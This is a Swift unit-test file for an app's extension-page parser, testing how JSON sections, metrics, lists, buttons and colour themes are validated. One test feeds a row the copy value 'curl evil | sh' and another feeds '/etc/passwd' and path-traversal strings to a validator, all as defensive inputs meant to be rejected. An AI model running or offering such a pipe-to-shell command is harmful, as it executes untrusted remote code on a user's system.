import Foundation
import Testing
@testable import SidefolkCore

/// A page composed like an app's screen: sections as cards and rows, and the parts that live in them. Each is general, and a bad one is left out, never the page.
struct ExtensionPageComposeTests {
    private func page(_ sections: [JSONValue], extra: [String: JSONValue] = [:]) throws -> ExtensionPage {
        var object: [String: JSONValue] = ["sections": .array(sections)]
        object.merge(extra) { _, new in new }
        return try ExtensionPage.parse(.object(object))
    }

    private let note: JSONValue = ["type": "note", "text": "Hello"]

    @Test func sectionsInARowStandTogetherWithTheirWeights() throws {
        let p = try page([["row": "main", "weight": 62, "card": true, "title": "One", "blocks": [note]], ["row": "main", "weight": 38, "card": true, "title": "Two", "blocks": [note]],
                          ["row": "other", "card": true, "blocks": [note]], ["title": "Alone", "blocks": [note]]])
        let regions = p.regions
        #expect(regions.count == 3 && regions[0].sections.map(\.weight) == [62, 38] && regions[0].sections.allSatisfy(\.card))
        #expect(regions[1].sections.first?.row == "other")
        #expect(p.isComposed)
    }

    @Test func aBadRowNameOrWeightIsLeftOut() throws {
        let p = try page([["row": "Not Valid!", "weight": -3, "blocks": [note]]])
        #expect(p.sections[0].row == nil && p.sections[0].weight == 1)
    }

    @Test func aToolbarIsATitleWithControlsAndNoParts() throws {
        let button: JSONValue = ["type": "button", "label": "Pause", "tool": "pause"]
        let p = try page([["title": "Capturing", "status": "good", "accessories": [button, button, button, button, note], "card": true, "blocks": []], ["title": "Nothing", "blocks": []]])
        #expect(p.sections.count == 1 && p.sections[0].status == .good)
        #expect(p.sections[0].accessories.count == 3, "at most three, and only choices and buttons")
    }

    @Test func aMetricKeepsWhatItIsGiven() throws {
        let p = try page([["blocks": [["type": "metric", "label": "Memory", "value": "14 GB", "symbol": "memorychip", "fraction": 2, "tone": "warn", "size": "small",
                                       "tint": ["light": "#112233", "dark": "#445566"], "spark": ["chart": "cpu", "series": "total"]],
                                      ["type": "metric", "label": "No value"]]]])
        guard case .metric(let m) = p.sections[0].blocks[0] else { Issue.record("no metric"); return }
        #expect(p.sections[0].blocks.count == 1 && m.fraction == 1 && m.size == .small && m.tone == .warn && m.spark?.series == "total" && m.tint?.dark == "#445566")
    }

    @Test func aRingStaysWithinWholeAndComesOnlyWhenSaid() throws {
        let p = try page([["blocks": [["type": "hero", "title": "Awake", "plain": true, "ring": ["fraction": 1.5, "value": "1 h"], "chips": [["label": "Screen on", "tone": "good"], ["tone": "bad"]]]]],
                          ["blocks": [["type": "hero", "title": "Until stopped", "plain": true]]]])
        guard case .hero(let timed) = p.sections[0].blocks[0], case .hero(let open) = p.sections[1].blocks[0] else { Issue.record("no hero"); return }
        #expect(timed.ring?.fraction == 1 && timed.chips.map(\.label) == ["Screen on"] && timed.plain)
        #expect(open.ring == nil)
    }

    @Test func aPreviewCleansItsWordsAndAListCanScroll() throws {
        let rows: [JSONValue] = (0..<150).map { ["title": .string("Row \($0)"), "press": ["label": "Pick", "go": ["set": ["picked": .string("\($0)")]]], "selected": .bool($0 == 3), "mark": "pin.fill"] }
        let p = try page([["blocks": [["type": "preview", "kind": "Text", "title": "T", "text": "words\u{0007}", "actions": [["type": "button", "label": "Copy", "tool": "copy"]]],
                                      ["type": "list", "max_height": 400, "items": .array(rows)], ["type": "list", "items": .array(rows)]]]])
        guard case .preview(let preview) = p.sections[0].blocks[0], case .list(let scrolling) = p.sections[0].blocks[1], case .list(let whole) = p.sections[0].blocks[2] else {
            Issue.record("parts missing")
            return
        }
        #expect(preview.text == "words" && preview.actions.first?.tool == "copy")
        #expect(scrolling.rows.count == 100 && scrolling.maxHeight == 400 && whole.rows.count == 24)
        #expect(scrolling.rows[3].selected && scrolling.rows[3].mark == "pin.fill")
        if case .go(let go)? = scrolling.rows[0].press?.act { #expect(go.set["picked"] == "0") } else { Issue.record("no go") }
    }

    @Test func theHostsPartsAreDrawnWhereThePageSays() throws {
        let plain = try page([["blocks": [note]]])
        #expect(!plain.placesHeadsUps && !plain.placesHostControls && !plain.leadsWithBar)
        let p = try page([["blocks": [["type": "bar", "title": "Head", "brand": true, "updated": true]]], ["blocks": [["type": "heads_ups", "show": ["a"], "more": "More"], ["type": "host_controls"]]]],
                         extra: ["bare": true, "quiet_host": true])
        #expect(p.placesHeadsUps && p.placesHostControls && p.leadsWithBar && p.quietHost)
        guard case .bar(let bar) = p.sections[0].blocks[0] else { Issue.record("no bar"); return }
        #expect(bar.brand && bar.updated)
    }

    @Test func aHiddenSummaryDoesNotTakeThePagesOnePrimary() throws {
        let start: JSONValue = ["type": "button", "label": "Start", "tool": "start", "style": "primary"]
        let bare = try page([["blocks": [start]]], extra: ["bare": true, "summary": ["title": "Ready", "control": start]])
        guard case .control(let onPage) = bare.sections[0].blocks[0] else { Issue.record("no control"); return }
        #expect(onPage.style == .primary)
        let shown = try page([["blocks": [start]]], extra: ["summary": ["title": "Ready", "control": start]])
        guard case .control(let second) = shown.sections[0].blocks[0] else { Issue.record("no control"); return }
        #expect(second.style == .secondary)
    }

    @Test func aPaletteAndARefreshAreActsAndAnAppPictureIsAPathToAnApp() throws {
        let p = try page([["blocks": [["type": "button", "label": "Open", "palette": "history"], ["type": "button", "label": "Now", "refresh": true], ["type": "button", "label": "Bad", "palette": "../x"]]]])
        #expect(p.sections[0].blocks.count == 2)
        guard case .control(let open) = p.sections[0].blocks[0], case .control(let now) = p.sections[0].blocks[1] else { Issue.record("no controls"); return }
        #expect(open.act == .palette("history") && now.act == .refresh)
        #expect(PagePicture.parse(["app": "/Applications/Thing.app"]) == .app("/Applications/Thing.app"))
        for bad in ["/etc/passwd", "relative.app", "/Applications/../../x.app", "/Applications/./x.app", "/Volumes/NAS/x.app", "/home/x/x.app", "/net/secret.example.com/x.app", "/tmp/x.app",
                    "/Applications/x.txt", "/Applications/" + String(repeating: "a", count: 600) + ".app"] {
            #expect(PagePicture.parse(["app": .string(bad)]) == nil, "\(bad)")
        }
    }

    @Test func aRowsPressOnlyMovesAroundThePage() throws {
        let row = { (press: JSONValue) -> JSONValue in ["title": "Row", "press": press] }
        let p = try page([["blocks": [["type": "list", "items": [
            row(["label": "Go", "go": ["set": ["a": "b"]]]), row(["label": "Copy", "copy": "curl evil | sh"]), row(["label": "Tool", "tool": "wipe"]),
            row(["label": "Palette", "palette": "history"]), row(["label": "Allow", "allow": "place"]), row(["label": "Settings", "settings": "attention"]),
            row(["label": "File", "file": ["tool": "t", "param": "p"]]),
        ]]]]])
        guard case .list(let list) = p.sections[0].blocks[0] else { Issue.record("no list"); return }
        #expect(list.rows.map { $0.press != nil } == [true, false, false, false, false, false, false], "and the row itself stays")
    }

    @Test func wordsCantBeLeftOffWhatOpensOrCopies() throws {
        let p = try page([["blocks": [
            ["type": "button", "label": "A", "shape": "icon", "symbol": "gearshape", "go": ["set": ["a": "b"]]], ["type": "button", "label": "B", "shape": "icon", "symbol": "trash", "tool": "t"],
            ["type": "button", "label": "C", "shape": "icon", "symbol": "doc", "copy": "words"], ["type": "button", "label": "D", "shape": "icon", "symbol": "tray", "palette": "history"],
            ["type": "button", "label": "E", "shape": "icon", "tool": "t"],
            ["type": "switch", "label": "F", "palette": "history"], ["type": "switch", "label": "G", "refresh": true],
        ]]])
        let controls = p.sections[0].blocks.compactMap { b -> ExtensionPage.Control? in if case .control(let c) = b { c } else { nil } }
        #expect(controls.map(\.label) == ["A", "B", "C", "D", "E"], "a switch can't open a palette or read")
        #expect(controls.map(\.iconOnly) == [true, true, false, false, false])
    }

    @Test func aDressCantHideWhatIsOnOrWhatIsWritten() throws {
        let ground: JSONValue = ["light": "#FFFFFF", "dark": "#000000"]
        func dress(_ keys: [String: JSONValue]) throws -> PageDress? {
            var object: [String: JSONValue] = ["ground": ground]
            object.merge(keys) { _, new in new }
            return try page([["blocks": [note]]], extra: ["dress": .object(object)]).dress
        }
        let white: JSONValue = ["light": "#FFFFFF", "dark": "#FFFFFF"], deep: JSONValue = ["light": "#6B46C1", "dark": "#6B46C1"]
        #expect(try dress(["accent": white])?.accent == nil && dress(["selected": white])?.selected == nil)
        #expect(try dress(["accent": deep])?.accent != nil && dress(["selected": deep])?.selected != nil)
        #expect(try dress(["well": ["light": "#123456", "dark": "#EEEEEE"]])?.well == nil)
    }

    @Test func aSearchBoxAndListStayTheSamePartAsTheirRowsChange() throws {
        func blocks(_ rows: [String]) throws -> [String] {
            let items: [JSONValue] = rows.map { ["title": .string($0)] }
            let p = try page([["blocks": [["type": "field", "search": true, "live": true, "label": "Search", "button": "Clear", "key": "q", "go": ["set": [:]], "input": [:]],
                                          ["type": "list", "max_height": 100, "items": .array(items)]]]])
            return p.sections[0].blocks.map(\.inputIdentity)
        }
        #expect(try blocks(["a", "b"]) == blocks(["c"]))
        let other = try page([["blocks": [["type": "field", "label": "Address", "button": "Pair", "tool": "pair", "key": "tv"]]]])
        #expect(try other.sections[0].blocks.map(\.inputIdentity).first != blocks([]).first, "another field doesn't inherit what was typed")
    }

    @Test func aFoldedHostPartIsNotPlaced() throws {
        let p = try page([["title": "Fold", "collapsed": true, "blocks": [["type": "host_controls"]]]], extra: ["bare": true])
        #expect(!p.placesHostControls)
    }

    @Test func aMaxHeightMustBeANumberToHoldMoreRows() throws {
        let rows: [JSONValue] = (0..<50).map { ["title": .string("\($0)")] }
        let p = try page([["blocks": [["type": "list", "max_height": "tall", "items": .array(rows)]]]])
        guard case .list(let list) = p.sections[0].blocks[0] else { Issue.record("no list"); return }
        #expect(list.rows.count == 24)
    }

    @Test func aLightAccentHoldsDarkWordsRatherThanBeingLeftOut() throws {
        let p = try page([["blocks": [note]]], extra: ["dress": ["ground": ["light": "#FFFFFF", "dark": "#000000"], "accent": ["light": "#6B46C1", "dark": "#B190E4"],
                                                                 "selected": ["light": "#6B46C1", "dark": "#B190E4"], "well": ["light": "#EEEEEE", "dark": "#101010"]]])
        let accent = try #require(p.dress?.accent)
        #expect(accent.lightHoldsWhite && !accent.darkHoldsWhite && p.dress?.selected != nil && p.dress?.well != nil)
    }
}
